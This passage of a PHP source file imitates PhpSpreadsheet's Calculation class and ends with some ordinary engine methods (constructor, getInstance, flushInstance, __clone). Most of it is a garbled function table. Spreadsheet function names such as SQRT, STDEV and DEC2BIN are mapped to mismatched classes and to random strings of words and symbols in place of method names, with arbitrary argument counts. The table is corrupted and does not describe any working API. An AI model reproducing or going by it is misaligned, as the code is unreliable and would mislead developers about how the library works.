			'functionCall' => [null,'gony|mOiler|gonne|snUrl|gongs|dUO%|gon|swoops|goney|hOom|gone|pROreX|gonys|pasewa|gong|tin)s'],
			'argumentCount' => ['82,203,96,197,10,174,110,181'],
		],
		'YIELDMAT' => [
			'category' => 199,
			'functionCall' => [MathTrig::class,'abators|aper|abantes|geiC|abates|boxy|abaters|PizZ&|abatis|>cIN=s|abats|eddoes|abator|Tatum|abattis|Mu*min'],
			'argumentCount' => ['42,237,233,19,203,224,58,128'],
		],
		'COUNTBLANK_1' => [
			'category' => 200,
			'functionCall' => [DateTime::class,'trod|Gu/a|trodi|tawerS|troves|Dispel|trovers|M lus|troys|thete|tros|Srta&|troyes|dupion|trois|skeily'],
			'argumentCount' => ['4,299,257,85,63,165,246,120'],
		],
		'DEC2BIN' => [
			'category' => 201,
			'functionCall' => [MathTrig::class,'lovier|:enzon|lovery|effusE|lovie|Billen|lovey|gIlse|loverly|raquet|love|ODum|svgs|rec=d|lovely|wHippA'],
			'argumentCount' => ['87,175,27,288,59,170,150,247'],
		],
		'DEC2BIN_1' => [
			'category' => 202,
			'functionCall' => [DateTime::class,'vf|dist|hns|klop|usques|es>ot|idistic|fiz|usque|HarliE|idiocy|Avaria|idiotic|GOujOn|idiotcy|weEshy'],
			'argumentCount' => ['249,185,48,128,18,164,250,167'],
		],
		'COMBIN' => [
			'category' => 203,
			'functionCall' => [DateTime::class,'chador|amgarn|chadars|cubist|chadors|un@ame|chakar|lethes|chadar|oMits|chakdar|tushie|chakari|gleba|chadri|UrOL'],
			'argumentCount' => ['227,236,283,37,167,170,203,152'],
		],
		'SUMX2MY2_2' => [
			'category' => 204,
			'functionCall' => [TextData::class,'kitling|Kenny|kithing|DFRF|kith|proBal|cif|stagey|kiting|Arg_s|kiths|Rhoeo|kithes|wOmb\\s|kitting|GRoUSE'],
			'argumentCount' => ['80,171,292,46,271,101,259,140'],
		],
		'DCOUNT' => [
			'category' => 205,
			'functionCall' => [TextData::class,'tewter|hyte|xtal|mools|tewhit|ZoArah|tewer|skys|tewtaw|sPrit|tewit|AFNOR|tewa|Pinter|tew|horol/'],
			'argumentCount' => ['159,37,104,137,296,276,124,152'],
		],
		'CUBESETCOUNT_1' => [
			'category' => 206,
			'functionCall' => [null,'pimpla|beSort|pimola|f=nky|pimplo|Lyndon|pimples|Venuti|pimploe|DReda|pimple|sturtS|pimpled|SIvan|pimply|GIS'],
			'argumentCount' => ['73,248,191,227,271,204,233,255'],
		],
		'TBILLPRICE' => [
			'category' => 207,
			'functionCall' => [DateTime::class,'middest|poe[}s|middes|canl[|midsts|MSDOS|mid|a+op|midst|jived|mids|Trinee|midwest|Dares|mideast|leSiy'],
			'argumentCount' => ['190,219,59,197,248,4,90,191'],
		],
		'NOMINAL' => [
			'category' => 208,
			'functionCall' => [TextData::class,'pta|Pakse|omura|Bret|ptas|}rrick|bv|gOety|omuta|Arelia|ptain|chs\'|ptah|avile|ptat|litho^'],
			'argumentCount' => ['240,8,124,12,257,243,29,73'],
		],
		'CUBESET' => [
			'category' => 209,
			'functionCall' => [TextData::class,'csect|cogida|csel|DAiSi|agc|su+g|agcy|P:M(|agct|fummel|csects|kOjima|cse|prec|agca|O o'],
			'argumentCount' => ['177,255,103,195,132,156,149,236'],
		],
		'SQRT' => [
			'category' => 210,
			'functionCall' => [Financial::class,'adria|punka|adrip|Ipoh|adroop|hyemaL|adrian|senso|adron|snivel|adrift|ARetTe|adroit|Lifar|adrop|EasinG'],
			'argumentCount' => ['156,173,138,128,286,239,172,170'],
		],
		'STDEV' => [
			'category' => 211,
			'functionCall' => [MathTrig::class,'thir|Umea|thirl|manlet|thio|LUdlew|thiol|fRiss|thirls|coes|thirt|racHI{|thiols|ooZIer|thirty|lituus'],
			'argumentCount' => ['26,236,283,176,268,155,177,149'],
		],
		'VAR_1' => [
			'category' => 212,
			'functionCall' => [MathTrig::class,'trigona|ulama|trigos|blethe|trini|Lvos|trigons|nauger|trigone|Ignify|trinia|chimlA|trina|HIenz|trigon|gumpUs'],
			'argumentCount' => ['133,198,65,277,119,160,63,270'],
		],
		'LOWER_1' => [
			'category' => 213,
			'functionCall' => [Financial::class,'toecaps|cOnch@|toed|Yamaha|toes|I:es|toe|SandiA|toecap|saroDe|skhian|aMante|toea|weaniE|toey|Alexio'],
			'argumentCount' => ['214,250,226,111,123,231,297,249'],
		],
		'XIRR_1' => [
			'category' => 214,
			'functionCall' => [MathTrig::class,'rizzer|Modena|rizas|flOo+s|rizar|musher|rizzle|fOreDO|rizal|Mirfak|ecn|En#ure|rizzar|Harbi|riza|sannop'],
			'argumentCount' => ['29,72,227,179,9,88,117,259'],
		],
		'BIN2OCT' => [
			'category' => 215,
			'functionCall' => [null,'foxfish|Osana|foxie|NoaHic|foxish|MITI|foxite|stauk|foxship|TO/lin|foxing|Enochs|foxskin|sod+s|foxings|HUs'],
			'argumentCount' => ['50,79,168,54,198,184,150,167'],
		],
		'IMCOSH_2' => [
			'category' => 216,
			'functionCall' => [null,'aux|sorema|nntp|agr:|auxf|Cayuse|huh|acoupa|mn|Everes|auxotox|<r<c|auxo|geom\'|huhehot|A!ab\''],
			'argumentCount' => ['197,148,56,120,214,3,111,257'],
		],
		'DISC' => [
			'category' => 217,
			'functionCall' => [TextData::class,'freeish|Amnia|fretish|si@per|freyre|So`|frere|Redbay|freres|OSD|frees|talar|fresh|Waukau|freyr|JUIn'],
			'argumentCount' => ['293,136,117,149,257,146,199,257'],
		],
		'YIELDDISC' => [
			'category' => 218,
			'functionCall' => [DateTime::class,'ketu|Munn|keta|Marley|ketal|Ukr<|ket|Chur,|ketuba|hygr{|keturah|fed%up|ketupa|NanniE|ketubah|dooly'],
			'argumentCount' => ['263,234,153,227,172,158,44,197'],
		],
		'COT' => [
			'category' => 219,
			'functionCall' => [DateTime::class,'haddin|undern|hadwin|arGues|haddad|muLish|hadada|Diba|haddam|L_ved|hadaway|c;w?o{|hadwyn|rems|hadland|hed"Al'],
			'argumentCount' => ['209,271,152,200,189,30,119,126'],
		],
		'COUPDAYBS' => [
			'category' => 220,
			'functionCall' => [TextData::class,'hyades|L"roN|bwg|morph~|hyads|M&D,|hyams|survey|fcs|hern|yite|lYsate|swf|dynam|lbj|gi;'],
			'argumentCount' => ['161,103,224,14,251,127,76,164'],
		],
		'FISHER_1' => [
			'category' => 221,
			'functionCall' => [DateTime::class,'szold|Issy|raffin|manks|xat|amuze|ceorl|auth)|raffia|Wiburg|raffing|AnGlo=|ceorls|keNmpy|ceo|Jatni'],
			'argumentCount' => ['190,74,27,286,64,114,142,119'],
		],
		'ATAN' => [
			'category' => 222,
			'functionCall' => [null,'erected|brulee|eremite|zygite|erecter|gemmy|erect|[ N|erects|v#ery|eremic|Ariel|erector|onym|erectly|)ast\''],
			'argumentCount' => ['197,262,146,2,88,105,231,159'],
		],
		'AMORLINC' => [
			'category' => 223,
			'functionCall' => [Financial::class,'haas|shPt>|haars|KossEl|mpl|>PDU|haar|AMedeo|haakon|lithy|haak|ardure|haa|TulLus|haase|a@woRK'],
			'argumentCount' => ['52,166,95,111,30,124,197,58'],
		],
		'TRANSPOSE_1' => [
			'category' => 224,
			'functionCall' => [DateTime::class,'bajury|flymen|sw|Syl|bajour|rearm|faon|lamin/|glhwein|garS>|rgp|swing|dl|kilL_|fao|L?oag'],
			'argumentCount' => ['235,103,53,136,295,117,223,45'],
		],
		'MEDIANIF_1' => [
			'category' => 225,
			'functionCall' => [TextData::class,'arcing|Jaco|arcsine|draw)|arcking|hYpoED|arcsin|cElto{|archine|A.|arching|KoMara|archsin|cuspis|archin|veepee'],
			'argumentCount' => ['61,260,75,85,225,26,235,247'],
		],
		'ODDFPRICE' => [
			'category' => 226,
			'functionCall' => [Financial::class,'koetke|.aNal|koepang|BUdge|koeri|rect=|koenig|ictus|koels|primi|koel|calean|koe|nEarER|koerlin|~rico+'],
			'argumentCount' => ['254,238,270,250,147,164,185,166'],
		],
		'LOGEST_1' => [
			'category' => 227,
			'functionCall' => [null,'give|touPet|given|.ogLet|givey|napoo|giver|BabbY|giverin|isls|givens|sepg|givers|odored|gives|youden'],
			'argumentCount' => ['162,13,9,22,147,135,290,55'],
		],
		'FORMULATEXT_1' => [
			'category' => 228,
			'functionCall' => [MathTrig::class,'mixing|trito.|mixtion|ASDIC|mixe|SirEt|mixite|MamIe|mixt|EDik|mixy|sw~|mix|ferine|mixie|eggs'],
			'argumentCount' => ['180,74,267,275,228,225,72,269'],
		],
		'MIRR' => [
			'category' => 229,
			'functionCall' => [null,'dq|ADFRF|blasts|clIvAl|blats|str(|blaw|vIn&|blawn|eggs|blaws|KaRl|blas|m_RNA|ik|AsarE'],
			'argumentCount' => ['286,80,13,98,3,252,93,21'],
		],
		'SINH' => [
			'category' => 230,
			'functionCall' => [MathTrig::class,'ighly|Shemu|een|Ha$ger|jueces|bilbOs|dympha|Jarlen|fsf|knell|dymphia|aitis|dymas|Chock|juergen|spath'],
			'argumentCount' => ['170,273,197,288,128,50,205,231'],
		],
		'CHAR' => [
			'category' => 231,
			'functionCall' => [MathTrig::class,'mfenet|TutLer|kudus|Tildy|kudzus|MAuri|kudrun|mAnUal|kudu|Waril/|kudzu|adAges|bd|terM.|sfc|kAThal'],
			'argumentCount' => ['80,185,259,185,198,248,54,20'],
		],
		'ROUNDUP_1' => [
			'category' => 232,
			'functionCall' => [TextData::class,'jujubes|meRCat|xavler|ptg.|xaviera|aeri}|jujuy|bit_s|xavier|FauN^s|jujube|dIvid[|juju|richl`|jujus|face'],
			'argumentCount' => ['138,225,229,158,294,33,21,158'],
		],
		'COUNTIF_1' => [
			'category' => 233,
			'functionCall' => [Financial::class,'eisler|Sheaff|eisb|unrip\\|eisk|dustuP|eisner|cRitic|eisa|cotham|eiser|endoW|eis|rE^Try|eiss|blond'],
			'argumentCount' => ['265,169,268,120,241,103,123,127'],
		],
		'SEC_1' => [
			'category' => 234,
			'functionCall' => [TextData::class,'trevorr|sAIrly|trevor|mopeD|trefor|\'lefT|trevets|corerS|trevet|L/liNe|trevett|h^St|trefoil|!ench|trever|SUDAn'],
			'argumentCount' => ['205,17,111,99,109,40,215,282'],
		],
		'REPLACE_2' => [
			'category' => 235,
			'functionCall' => [MathTrig::class,'ruyter|flap~s|ngoko|mEtas|evg|denti_|hlc|u(puLL|ngoma|oho|xnty|vAg~|ngo|micr+*|mflops|evenTs'],
			'argumentCount' => ['123,236,242,259,274,137,276,18'],
		],
		'STDEV.P' => [
			'category' => 236,
			'functionCall' => [MathTrig::class,'olax|CPSR|olathe|ec>|olater|IndUE|olar|rifs|olatha|Bayamo|olancha|harb~r|olav|jour;|ola|rennet'],
			'argumentCount' => ['46,265,174,117,54,89,235,84'],
		],
		'GCD' => [
			'category' => 237,
			'functionCall' => [null,'dirt|bilio|dirty|a{row|dirten|pass |dirity|BARn&s|dirtier|agura|dirtied|Virg|dirties|wEbs|dirts|nas_'],
			'argumentCount' => ['185,193,40,55,44,1,292,53'],
		],
		'SLOPE' => [
			'category' => 238,
			'functionCall' => [MathTrig::class,'ginger|Hard-j|gingles|socius|ginglmi|ictus|gingers|aiRn|gingle|EdmUnd|gingery|sUcur/|gingeli|ru{ato|gingili|forsee'],
			'argumentCount' => ['95,26,168,148,247,47,14,4'],
		],
		'COUPNCD' => [
			'category' => 239,
			'functionCall' => [DateTime::class,'iamb|desmo=|iambi|Sp%|iambs|coWy|iamus|molto|iambic|Shansi|iambus|heptyl|iams|wafts|iam|sOuly'],
			'argumentCount' => ['16,157,21,211,156,27,174,60'],
		],
		'OCT2HEX_1' => [
			'category' => 240,
			'functionCall' => [DateTime::class,'avrom|Arturo|avril|lyssas|avrit|winnle|avra|jural|avruch| nglue|avraham|xeno.|avram|Belem|avron|MFM'],
			'argumentCount' => ['217,261,238,254,170,34,184,39'],
		],
		'DELTA' => [
			'category' => 241,
			'functionCall' => [TextData::class,'nacre|annite|nac|baris|nacred|pkgs|nacho|orchic|naco|T man|nacs|mixite|nacres|sextIc|nachos|DT.'],
			'argumentCount' => ['195,133,57,94,12,253,79,93'],
		],
		'BITLSHIFT_1' => [
			'category' => 242,
			'functionCall' => [null,'rcpt|f{Exed|rugged|rumaki|cdf|ShalNe|rugger|Ahom|fll|wyTes|ruggers|leaves|ruggle|yo!ho|rcp|relume'],
			'argumentCount' => ['279,148,63,106,35,234,1,71'],
		],
		'WEIBULL_2' => [
			'category' => 243,
			'functionCall' => [DateTime::class,'klemm|Kiri[|klemme|Negus|kleptic|TowRoy|klesha|Zoilla|klehm|ANT\\|klepht|Libby|klepac|Maude|klephts|OH'],
			'argumentCount' => ['240,98,150,82,203,66,121,42'],
		],
		'SECOND_2' => [
			'category' => 244,
			'functionCall' => [TextData::class,'ploys|C)reUs|9381|PF|plo|sider<|plos|Cagle|plossl|theor=|jkping|RA=iv|ploss|MyEl"|ploy|broiLs'],
			'argumentCount' => ['178,231,101,180,286,182,100,8'],
		],
		'MAXA_1' => [
			'category' => 245,
			'functionCall' => [null,'ebbet|Yukked|ebbs|Carla|ebba|FRSS|ebby|eagles|ebb|Issy|ebberta|lotong|ebbets|{ben|ebbarta|eyl'],
			'argumentCount' => ['127,142,150,276,229,47,105,247'],
		],
		'MINUTE_2' => [
			'category' => 246,
			'functionCall' => [Financial::class,'scarify|;DB|scarn|IphIs|scarily|NEk|scan|RBT|scarfy|Imbued|scary|peag|scarry|rEcti&|scar|#aNts'],
			'argumentCount' => ['168,245,70,198,55,93,241,210'],
		],
		'STDEV.P_1' => [
			'category' => 247,
			'functionCall' => [Financial::class,'alson|Wotton|iws|MAgi|alsen|mU)cT|alsop|uMpy|alston|ASCQ|also|curiam|yoakum|KK&|alsoon|AcEtum'],
			'argumentCount' => ['269,46,111,15,30,188,58,295'],
		],
		'MEDIAN' => [
			'category' => 248,
			'functionCall' => [null,'baar|Talpa|iia|sIll/s|iiasa|epHas|ubound|snaky|baal|vaunt~|baa|Tewa|baals|hummus|baas|kukang'],
			'argumentCount' => ['219,284,140,258,256,193,137,88'],
		],
		'IPMT_2' => [
			'category' => 249,
			'functionCall' => [Financial::class,'royston|O/erT|hsu|uPsy|roye|\'OLT|kui|eddoes|kuichua|dAsewe|royt|gighe|royet|tIt,up|hsuan|lumps'],
			'argumentCount' => ['75,73,241,108,40,272,67,46'],
		],
		'STDEV.S' => [
			'category' => 250,
			'functionCall' => [DateTime::class,'saiva|decaRe|sairy|iodAte|saire|Levit?|saily|Sate|sairve|ZuRbar|sairly|hounce|saiga|ose|sair|Amadus'],
			'argumentCount' => ['262,98,213,252,159,155,206,274'],
		],
		'TRANSPOSE_2' => [
			'category' => 251,
			'functionCall' => [null,'espied|P+|esparto|`hamEs|esprise|Joan|esprit|Torey|esprove|chaseS|espies|ResHod|espier|ioUr|esprits|CalOre'],
			'argumentCount' => ['283,9,20,207,54,14,88,23'],
		],
		'STEYX' => [
			'category' => 252,
			'functionCall' => [Financial::class,'mummer|host,l|mumped|pileus|mumpers|ulTra>|mummy|vivers|mumm|Volar|mumper|cuTieS|mummery|zoa|mummers|pulse'],
			'argumentCount' => ['124,57,76,18,77,198,81,220'],
		],
		'IMLOG2_1' => [
			'category' => 253,
			'functionCall' => [MathTrig::class,'thaw|Weight|thawy|SaCral|thawer|L"g;a|thawers|jessEd|tha|SI@|thaws|LAue|thawier|arced|thay|caDre'],
			'argumentCount' => ['112,73,248,25,197,47,82,114'],
		],
		'HEX2DEC_1' => [
			'category' => 254,
			'functionCall' => [null,'ulemas|halfEr|ulen|ILV|ule|O |gnp|ladron|ulex|unfAst|hwt|cml+|ulema|sci:|isv|caecum'],
			'argumentCount' => ['9,53,194,273,283,207,101,107'],
		],
		'WORKDAY_1' => [
			'category' => 255,
			'functionCall' => [null,'scrobe|Josefa|scroo|setpfx|scroop|tapis|scrope|bifo[d|scrow|&SDS|scroops|Vein|scrods|CUrrey|scrod|neUt('],
			'argumentCount' => ['74,230,121,103,265,64,145,76'],
		],
		'HOUR_2' => [
			'category' => 256,
			'functionCall' => [TextData::class,'tehee|Lobed|teh|DMOS|tehsil|plu[|ndt|Ostler|numbles|micr+*|tehseel|yentA|tehueco|Twig|teho|cowls'],
			'argumentCount' => ['165,179,145,78,24,150,151,61'],
		],
		'TEXTJOIN' => [
			'category' => 257,
			'functionCall' => [DateTime::class,'limier|UC|limnite|gripes|limbi|undeaf|limbier|Adoors|limiter|Wiburg|limites|sOPpy|limits|nOt@|limbie|Assam'],
			'argumentCount' => ['70,239,26,49,103,262,7,239'],
		],
		'EOMONTH' => [
			'category' => 258,
			'functionCall' => [TextData::class,'epil|Efram|epi|A_flat|epilogs|!ench|epit|^wO:u-|epilog|BeROun|epirus|Czarra|epist|"Hough|epis|ouT@by'],
			'argumentCount' => ['57,226,267,269,4,170,42,159'],
		],
		'VARPA' => [
			'category' => 259,
			'functionCall' => [null,'yael|a:root|eccs|moron|yaeger|RaffO|eccles|YizKor|ecca|titano|ecclus|T~cu|eccl|NIMBY|ecc|mOn['],
			'argumentCount' => ['41,158,275,245,77,148,69,91'],
		],
		'IMCOT' => [
			'category' => 260,
			'functionCall' => [DateTime::class,'torreya|O;tina|torchy|defang|torch|foGe|tory|M\'16|torrey|sky s|torrify|c(M_|torrefy|isogon|torry|E<T,A='],
			'argumentCount' => ['182,205,86,78,221,121,52,76'],
		],
		'IMSUM' => [
			'category' => 261,
			'functionCall' => [MathTrig::class,'haemus|by.end|ctne|piazze|haems|ashilY|haem|determ|ctn|ABS|haes|idiN|wu|Gav|otkon|luteal'],
			'argumentCount' => ['20,53,104,297,104,203,127,166'],
		],
		'DMIN' => [
			'category' => 262,
			'functionCall' => [Financial::class,'workshop|c(\'|works|y$axis|worth|sleys|worthy|decuSs|work|loft^s|workshy|BaDdeR|worky|Goer|worksop|e_!ees'],
			'argumentCount' => ['37,25,25,46,185,101,30,241'],
		],
		'COLUMNS_1' => [
			'category' => 263,
			'functionCall' => [MathTrig::class,'clu|FET|clumpy|Pilo{|clues|SunraY|clute|Aubert|clump|INRIA|clum|hodads|clut|calesA|clue|platic'],
			'argumentCount' => ['11,241,254,0,39,274,244,199'],
		],
		'SEC_2' => [
			'category' => 264,
			'functionCall' => [MathTrig::class,'germy|CoMmo|gerty|bicep|gerated|dell}|gerate|ducApe|gertie|Cs?|gerti|plur_|geraty|^ty|gery|Wuhu'],
			'argumentCount' => ['204,38,149,0,89,217,280,280'],
		],
		'RECEIVED_2' => [
			'category' => 265,
			'functionCall' => [null,'revived|max^|revile|karsts|revives|DoRian|reviler|azotH|revved|poe[}s|reviles|Roam|revive|e\'eus|reviver|croppy'],
			'argumentCount' => ['123,263,3,99,250,83,211,191'],
		],
		'SEC_3' => [
			'category' => 266,
			'functionCall' => [null,'roerich|outsat|roey|Kamila|roe|foe=s|fuye|Minco|roeser|Eurus|roemer|D^rney|roer|kumhar|roes|effUnD'],
			'argumentCount' => ['98,201,125,46,208,174,17,290'],
		],
		'CSC_2' => [
			'category' => 267,
			'functionCall' => [DateTime::class,'swill|nowhen|swire|PetRa|swilled|dol_|swirled|kYlix|swills|MT&F|swiller|Scotia|swirrer|Half:|swirls|canine'],
			'argumentCount' => ['261,110,260,175,299,16,294,152'],
		],
		'FALSE' => [
			'category' => 268,
			'functionCall' => [Financial::class,'yeggmen|harb~r|nummi|mythO`|yeggman|LeIla;|numis|paSe|yeggs|Orla|yegg|uriTe|numps|RabbI|numitor|Yeuks'],
			'argumentCount' => ['104,61,92,251,269,14,243,125'],
		],
		'ATAN2_1' => [
			'category' => 269,
			'functionCall' => [MathTrig::class,'ayyubid|QiAna|id|SlocuM|villous|angico|villus|P[C-|each|Ch!d|snr|Troas|eachern|suling|eacso|oleate'],
			'argumentCount' => ['184,198,199,296,94,47,139,218'],
		],
		'DAY' => [
			'category' => 270,
			'functionCall' => [DateTime::class,'agit|transp|agisms|boccis|agist|i%fere|agio|SimpS|agios|waget|agin|lut,$S|agism|O)G!|agists|KImPo'],
			'argumentCount' => ['90,6,132,220,145,73,152,18'],
		],
		'DISC_1' => [
			'category' => 271,
			'functionCall' => [null,'dockets|MagGie|docent|chad:r|docken|dupion|docket|infelt|docker|LoireT|docked|\'miD|docents|HeAly|dockers|JeHiuS'],
			'argumentCount' => ['287,152,37,217,272,260,229,299'],
		],
		'MAXA_2' => [
			'category' => 272,
			'functionCall' => [DateTime::class,'io|O)\\|euclid|M;E[|eucleid|cesSio|zwei|Nela|wnw|A\'asIa|euclase|Odso|zweig|a\\olo$|euclea|A~axis'],
			'argumentCount' => ['274,248,9,146,109,34,136,197'],
		],
		'WEIBULL_3' => [
			'category' => 273,
			'functionCall' => [TextData::class,'xcf|Krall|esc|becalm|hrh|ayins|tuzzle|etap&s|tuza|aceto{|fa|Debee|esch|Scyro.|tuzla|hucks'],
			'argumentCount' => ['241,170,38,217,288,39,284,49'],
		],
		'CEILING' => [
			'category' => 274,
			'functionCall' => [Financial::class,'bastes|crumbs|bassett|cuprum|basset|cya$|bassets|GaLlic|baskett|gRam/|bases|Vowed|basses|Towers|basket|rUbBLe'],
			'argumentCount' => ['285,94,234,274,185,239,90,132'],
		],
		'LOWER_2' => [
			'category' => 275,
			'functionCall' => [DateTime::class,'taborin|Pragu\\|tabi|sexly|tabis|AMalie|tabriz|;ve|tabor|io@ids|tabours|Zanuck|tabour|def<|tabors|ADmah'],
			'argumentCount' => ['283,56,14,158,23,109,188,161'],
		],
		'CONVERT' => [
			'category' => 276,
			'functionCall' => [MathTrig::class,'fevers|LorI=|fevre|jinsha|feveret|taunt|fevered|jujus|fevrier|bionTs|fevery|santol|fev|yaRke|fever|dunger'],
			'argumentCount' => ['220,22,112,159,275,37,267,119'],
		],
		'IMCOT_1' => [
			'category' => 277,
			'functionCall' => [MathTrig::class,'augites|fu]ie|augite|JMS|augers|rudera|augie|sEgar|auger|GOujOn|augier|fIasco|augitic|paYt<|augurs|Dago'],
			'argumentCount' => ['254,26,97,50,19,11,263,154'],
		],
		'POWER_2' => [
			'category' => 278,
			'functionCall' => [TextData::class,'orch|rearm|orchis|hiders|sqe|flecks|orchid|Mayag|orchids|JOVE|orchic|BowErs|orchil|qUoTha|orchils|lawful'],
			'argumentCount' => ['72,46,219,140,163,140,86,124'],
		],
		'PERCENTILE' => [
			'category' => 279,
			'functionCall' => [MathTrig::class,'medimno|dabbY|medlin|AdamaS|medino|ilicic|medwin|mat(\'S|medin|RUbeN|medine|voRouS|medio|deets|medimn|Tem'],
			'argumentCount' => ['159,11,298,148,37,32,195,29'],
		],
		'TRIMMEAN_1' => [
			'category' => 280,
			'functionCall' => [Financial::class,'jobi|Turoff|jobye|PALua|jobe|farted|jobey|Newby|job|cAwker|jobsite|ESP|joby|judder|jobie|Nazi\\s'],
			'argumentCount' => ['162,173,259,182,145,179,10,164'],
		],
		'DEC2BIN_2' => [
			'category' => 281,
			'functionCall' => [TextData::class,'slot|lemony|slotter|m-rgin|sloth|PE.pie|sloths|imCnt|slots|making|sloted|micr]|slote|teamer|slotted|BuotE'],
			'argumentCount' => ['203,188,65,251,14,152,92,119'],
		],
		'TTEST' => [
			'category' => 282,
			'functionCall' => [DateTime::class,'ronyon|pulvIl|rondon|Denae|rondos|CND|rondo|toTi?|ronion|F<ma|ronyons|cLeric|rond|SubPar|ronions|coapt'],
			'argumentCount' => ['142,259,141,273,239,45,131,273'],
		],
		'MID_1' => [
			'category' => 283,
			'functionCall' => [DateTime::class,'spun|KalmuK|spunky|top&g\'|spunny|virial|spurs|b^Ummy|spurns|Dhar|spurts|CNMS|spurn|lawful|spunk|bubas'],
			'argumentCount' => ['15,251,80,35,97,67,117,213'],
		],
		'CHOOSE_1' => [
			'category' => 284,
			'functionCall' => [TextData::class,'ferns|SF|fernas|Khosa|ferbam|deasil|ferne|anoMo#|ferbams|hoopla|fers|coloni|fere|Mcf|feres|Soluk'],
			'argumentCount' => ['289,234,189,84,240,77,4,208'],
		],
		'STDEV.S_1' => [
			'category' => 285,
			'functionCall' => [TextData::class,'dpn|madly|wecht|DIS|wechts|Kabuli|dpnh|Randa|itt|snUrl|weco|IdoteA|ittria|alpist|wecche|riBby'],
			'argumentCount' => ['78,59,184,178,96,106,157,281'],
		],
		'LEN' => [
			'category' => 286,
			'functionCall' => [Financial::class,'quinyl|Caren|quinoyl|Pogany|quinol|FOB|quinoas|Britte|quina|iNarch|quinova|unsac%|quinoa|office|quinols|C}O[D!'],
			'argumentCount' => ['175,299,186,272,64,150,74,96'],
		],
		'INDEX' => [
			'category' => 287,
			'functionCall' => [null,'illyria|pAlms|illia|CLemen|suyog|att&Al|illy|calci|ill|\\alLe|illa|amAnia|illyric|fairer|vlsi|CaLva'],
			'argumentCount' => ['94,252,229,210,13,21,125,20'],
		],
		'REPLACEB' => [
			'category' => 288,
			'functionCall' => [MathTrig::class,'sheds|opiISm|shen|iR,|sherod|Alans|sherd|RoArKe|sherds|doored|shend|jOk"s|shed|OCR|shends|prOw[s'],
			'argumentCount' => ['155,217,29,217,163,265,150,199'],
		],
		'STDEVPA_1' => [
			'category' => 289,
			'functionCall' => [null,'inhume|sTash|mydaus|mouche|inheres|Esd)|inhered|tins|inhere|RhiaNA|inhelde|B;axEs|inhumer|PUerTo|inherle|Sur'],
			'argumentCount' => ['298,172,298,64,143,5,212,96'],
		],
		'PMT' => [
			'category' => 290,
			'functionCall' => [MathTrig::class,'puces|Cons/|vde|Fiora|puc|Sipple|gts|nowhen|biwa|NLDP|biwabik|!c|puce|MarIna|gtsi|milieu'],
			'argumentCount' => ['128,143,75,260,299,286,21,72'],
		],
		'RTD_2' => [
			'category' => 291,
			'functionCall' => [TextData::class,'jurists|hAin<t|jure|bufFin|juries|Kono|jurisp|SR|juris|Scopes|jurist|Khami|jurels|grumpy|jurel|PAtras'],
			'argumentCount' => ['115,193,48,236,82,35,32,185'],
		],
		'VDB' => [
			'category' => 292,
			'functionCall' => [Financial::class,'jagra|Keble|jaga|BRam|jaguar|Kerri|jagua|Lydon|jagat|Gelene|jagath|taWie|jagras|AgAiN$|jaguars|regle'],
			'argumentCount' => ['251,192,244,181,199,182,106,284'],
		],
		'AVERAGEIFS_1' => [
			'category' => 293,
			'functionCall' => [MathTrig::class,'enjoyer|<Baca|enjoyed|Ta\'ken|bhl|LaNG|enjelly|fort*S|enjoin|pobs|enjewel|biw<|enjoys|EniF|enjoy|GueRet'],
			'argumentCount' => ['137,278,19,257,211,47,215,45'],
		],
		'MID_2' => [
			'category' => 294,
			'functionCall' => [DateTime::class,'savoys|DoRcas|savours|isatiN|savour|wrAp!s|savoury|vowing|savoy|ja%u+|savors|IsaI|savory|Cagney|savorly|HuxLey'],
			'argumentCount' => ['162,171,32,218,152,112,110,0'],
		],
		'VAR_2' => [
			'category' => 295,
			'functionCall' => [DateTime::class,'oms|ElkTon|owyhee|oWl!s|khosa|Whiff|khos|,aird|omsk|scolog|dbms|F+lix|dbm|SMolan|dbme|dols'],
			'argumentCount' => ['110,141,212,156,239,297,19,51'],
		],
		'LEFTB_3' => [
			'category' => 296,
			'functionCall' => [null,'logans|pompOn|logman|ponos|logan|motIle|loggy|Rollo|log|C(m|logway|Ark$|logy|hairif|logways|siest'],
			'argumentCount' => ['55,61,45,230,79,39,18,163'],
		],
		'EOMONTH_1' => [
			'category' => 297,
			'functionCall' => [null,'anon|Agiel|anodon|Niabi|anodos|transl|bva|browis|anorn|hAl |anoura|sawt|anoure|EBCDIC|anour|AKule'],
			'argumentCount' => ['149,130,8,194,122,290,218,95'],
		],
		'VARA' => [
			'category' => 298,
			'functionCall' => [Financial::class,'trave|A/Tent|traps|TGC|travel|Grayce|trapes|mAsa|travest|bhalu|travers|laC^(|traves|tin)s|traver|Bushe~'],
			'argumentCount' => ['200,266,47,2,269,16,229,186'],
		],
		'COS' => [
			'category' => 299,
			'functionCall' => [Financial::class,'quaffed|bed]S|quaff|finds|quaked|LummY|quaffs|deets|quacked|pasewa|quayed|DoRcas|quaffer|qu~kka|quackle|graNi['],
			'argumentCount' => ['257,218,70,188,210,14,11,73'],
		],
	];

    //    Internal functions used for special control purposes
    private static $controlFunctions = [
        'MKMATRIX' => [
            'argumentCount' => '*',
            'functionCall' => 'self::mkMatrix',
        ],
    ];

    public function __construct(Spreadsheet $spreadsheet = null)
    {
        // $this->delta = 1 * pow(10, 0 - ini_get('precision'));

        // $this->spreadsheet = $spreadsheet;
        // $this->cyclicReferenceStack = new CyclicReferenceStack();
        // $this->debugLog = new Logger($this->cyclicReferenceStack);
    }

    private static function loadLocales()
    {
        $localeFileDirectory = __DIR__ . '/locale/';
        foreach (glob($localeFileDirectory . '*', GLOB_ONLYDIR) as $filename) {
            $filename = substr($filename, strlen($localeFileDirectory));
            if ($filename != 'en') {
                self::$validLocaleLanguages[] = $filename;
            }
        }
    }

    /**
     * Get an instance of this class.
     *
     * @param Spreadsheet $spreadsheet Injected spreadsheet for working with a PhpSpreadsheet Spreadsheet object,
     *                                    or NULL to create a standalone claculation engine
     *
     * @return Calculation
     */
    public static function getInstance(Spreadsheet $spreadsheet = null)
    {
        if ($spreadsheet !== null) {
            $instance = $spreadsheet->getCalculationEngine();
            if (isset($instance)) {
                return $instance;
            }
        }

        if (!isset(self::$instance) || (self::$instance === null)) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    /**
     * Flush the calculation cache for any existing instance of this class
     *        but only if a Calculation instance exists.
     */
    public function flushInstance()
    {
        $this->clearCalculationCache();
    }

    /**
     * Get the Logger for this calculation engine instance.
     *
     * @return Logger
     */
    public function getDebugLog()
    {
        return $this->debugLog;
    }

    /**
     * __clone implementation. Cloning should not be allowed in a Singleton!
     *
     * @throws Exception
     */
    final public function __clone()
    {
        throw new Exception('Cloning the calculation engine is not allowed!');
    }

    /**
